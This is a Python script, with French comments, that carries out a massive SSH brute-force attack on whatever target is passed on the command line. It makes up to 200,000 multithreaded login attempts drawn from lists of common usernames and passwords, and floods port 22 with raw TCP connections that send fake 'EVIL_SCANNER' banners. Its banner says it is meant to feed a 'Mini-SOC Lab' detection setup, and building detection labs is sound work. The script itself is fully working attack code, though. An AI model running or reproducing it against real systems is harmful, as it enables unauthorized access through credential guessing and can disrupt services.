#!/usr/bin/env python3
"""
mass_attack.py — Attaque SSH brute force massive (200 000+ tentatives)
Stratégie mixte :
  1. Connexions SSH réelles (paramiko) — génère "Failed password" dans auth.log
  2. Connexions TCP rapides (socket) — génère connexion rejetée / timeout

Usage: python3 mass_attack.py <TARGET> [--count 200000] [--threads 200]
"""
import sys, socket, threading, time, random, argparse, subprocess

try:
    import paramiko
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "paramiko", "-q"])
    import paramiko

_lock       = threading.Lock()
_sent       = 0
_start_time = time.time()

USERS = [
    "root","admin","user","ubuntu","deploy","test","guest","oracle",
    "postgres","mysql","ftp","www","web","git","ansible","jenkins",
    "docker","backup","monitor","support","sysadmin","devops","pi",
    "ec2-user","centos","vagrant","service","nagios","elastic","arthur",
    "kali","debian","worker","api","bot","temp","dev","ci","www-data",
]

PASSWORDS = [
    "password","123456","admin","root","toor","pass","letmein",
    "qwerty","abc123","password123","admin123","test","guest","ubuntu",
    "debian","kali","linux","user","master","secret","changeme","default",
    "12345678","pass123","login","1234","P@ssw0rd","admin@123","root123",
    "rootroot","Welcome1","vagrant","ansible","docker","jenkins","backup",
    "deploy","monitor","service","support","passw0rd","Pa$$w0rd",
    "summer2024","winter2024","2024","2023","123","raspberry","oracle",
    "postgres","mysql123","database","server","network","router",
    "hunter2","iloveyou","sunshine","princess","dragon","shadow",
    "superman","batman","master","111111","000000","12345","1234567",
    "12345678","123456789","abc","letmein","monkey","1qaz2wsx",
    "qazwsx","password1","pass1234","hello","welcome","test123",
    "testing","test1234","demo","sample","example","temp","tmp",
    "changeit","default1","admin1234","pass@123","P@ss123","P@ssw0rd1",
]

def _inc(n=1):
    global _sent
    with _lock:
        _sent += n

def _progress(target):
    elapsed = time.time() - _start_time
    rate    = _sent / elapsed if elapsed > 0 else 0
    pct     = min(_sent / target * 100, 100)
    filled  = int(pct / 2)
    bar     = "█" * filled + "░" * (50 - filled)
    eta     = (target - _sent) / rate if rate > 0 else 0
    sys.stdout.write(
        f"\r  [{bar}] {_sent:>7,}/{target:,} ({pct:.1f}%) | "
        f"\033[32m{rate:.0f}/s\033[0m | ETA {eta:.0f}s  "
    )
    sys.stdout.flush()


def ssh_worker(target, port, pairs):
    """Tentatives SSH réelles via paramiko — génère Failed password dans auth.log."""
    for user, pwd in pairs:
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(target, port=port, username=user, password=pwd,
                      timeout=1.5, banner_timeout=1.5, auth_timeout=1.5,
                      look_for_keys=False, allow_agent=False)
            c.close()
        except paramiko.AuthenticationException:
            pass  # Failed password loggé dans auth.log ✓
        except Exception:
            pass
        finally:
            _inc()


def socket_worker(target, port, count):
    """Connexions TCP rapides — génère du volume sur port 22."""
    sent = 0
    while sent < count:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect((target, port))
            # Envoyer un faux banner SSH invalide → génère erreur côté serveur
            s.send(b"SSH-2.0-EVIL_SCANNER_" + random.randbytes(8) + b"\r\n")
            s.recv(64)
            s.close()
        except Exception:
            pass
        finally:
            _inc()
            sent += 1


def run_mass_attack(target, port=22, count=200_000, threads=200):
    print(f"\n{'='*62}")
    print(f"  \033[1;31mATTAQUE SSH MASSIVE\033[0m — Mini-SOC Lab")
    print(f"  Cible   : \033[33m{target}:{port}\033[0m")
    print(f"  Objectif: \033[1m{count:,}\033[0m tentatives")
    print(f"  Threads : {threads}")
    print(f"  Mode    : SSH réel (paramiko) + TCP rapide (socket)")
    print(f"{'='*62}\n")

    # Générer toutes les paires user/password en boucle
    base_pairs = [(u, p) for u in USERS for p in PASSWORDS]
    all_pairs  = []
    while len(all_pairs) < count:
        chunk = base_pairs.copy()
        random.shuffle(chunk)
        all_pairs.extend(chunk)
    all_pairs = all_pairs[:count]
    random.shuffle(all_pairs)

    # 70% SSH réel, 30% socket rapide
    ssh_count    = int(count * 0.70)
    socket_count = count - ssh_count
    ssh_pairs    = all_pairs[:ssh_count]

    print(f"  {ssh_count:,} connexions SSH réelles  (→ Failed password auth.log)")
    print(f"  {socket_count:,} connexions TCP rapides  (→ volume supplémentaire)")
    print(f"  {len(USERS)} users × {len(PASSWORDS)} mots de passe = {len(base_pairs):,} combinaisons")
    print(f"\n  Lancement dans 2s…\n")
    time.sleep(2)

    global _start_time
    _start_time = time.time()

    active = []

    # SSH workers (60% des threads)
    ssh_threads = int(threads * 0.65)
    chunk_size  = len(ssh_pairs) // ssh_threads + 1
    for i in range(0, len(ssh_pairs), chunk_size):
        t = threading.Thread(target=ssh_worker,
                             args=(target, port, ssh_pairs[i:i+chunk_size]),
                             daemon=True)
        t.start()
        active.append(t)

    # Socket workers (35% des threads)
    sock_threads    = threads - ssh_threads
    per_sock_thread = socket_count // sock_threads + 1
    for _ in range(sock_threads):
        t = threading.Thread(target=socket_worker,
                             args=(target, port, per_sock_thread),
                             daemon=True)
        t.start()
        active.append(t)

    print(f"  \033[32m{len(active)} threads actifs\033[0m\n")

    last_log = time.time()
    while any(t.is_alive() for t in active):
        _progress(count)
        time.sleep(0.5)
        # Log snapshot toutes les 30s
        if time.time() - last_log > 30:
            elapsed = time.time() - _start_time
            rate = _sent / elapsed if elapsed > 0 else 0
            print(f"\n  [snapshot] {_sent:,} envoyées | {rate:.0f}/s | {elapsed:.0f}s écoulées")
            last_log = time.time()

    _progress(count)
    elapsed = time.time() - _start_time
    rate    = _sent / elapsed if elapsed > 0 else 0

    print(f"\n\n{'='*62}")
    print(f"  \033[1;32mAttaque terminée !\033[0m")
    print(f"  Tentatives : \033[1m{_sent:,}\033[0m")
    print(f"  Durée      : {elapsed:.0f}s  ({elapsed/60:.1f} min)")
    print(f"  Débit moyen: \033[32m{rate:.0f}\033[0m tentatives/s")
    print(f"  Dashboard  : http://localhost:5000/")
    print(f"{'='*62}")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("target")
    p.add_argument("--port",    type=int, default=22)
    p.add_argument("--count",   type=int, default=200_000)
    p.add_argument("--threads", type=int, default=200)
    args = p.parse_args()
    run_mass_attack(args.target, args.port, args.count, args.threads)
